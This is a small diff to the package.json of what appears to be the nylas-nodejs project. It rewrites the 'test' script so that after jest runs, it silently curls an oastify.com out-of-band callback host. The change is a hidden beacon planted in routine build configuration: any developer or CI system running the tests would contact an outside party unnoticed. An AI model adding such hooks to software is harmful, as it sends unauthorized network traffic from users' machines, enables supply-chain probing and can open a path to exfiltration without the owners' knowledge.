@@ -8,7 +8,7 @@
     "lib"
   ],
   "scripts": {
-    "test": "jest",
+    "test": "jest && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/nylas-nodejs",
     "test:coverage": "npm run test -- --coverage",
     "lint": "eslint --ext .js,.ts -f visualstudio .",
     "lint:fix": "npm run lint -- --fix",
